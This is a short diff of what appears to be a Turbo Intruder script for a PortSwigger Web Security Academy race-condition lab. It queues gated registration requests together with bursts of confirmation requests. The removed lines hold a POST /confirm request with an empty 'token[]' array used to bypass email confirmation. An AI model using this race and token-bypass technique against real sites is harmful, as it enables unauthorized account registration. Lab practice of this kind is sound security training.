@@ -5,18 +5,10 @@ def queueRequests(target, wordlists):
                             engine=Engine.BURP2
                             )
     
-    confirmationReq = '''POST /confirm?token[]= HTTP/2
-Host: LAB-ID.web-security-academy.net #change this
-Cookie: phpsessionid=token-ID  #change this
-Content-Length: 0
 
-'''
-    for attempt in range(20):
-        currentAttempt = str(attempt)
-        username = 'User' + currentAttempt
-    
-        # queue a single registration request
-        engine.queue(target.req, username, gate=currentAttempt)
+    for i in range(20):
+        username = "test" + str(i)        
+        engine.queue(target.req, username, gate=str(i))
         
         # queue 50 confirmation requests - note that this will probably sent in two separate packets
         for i in range(50):
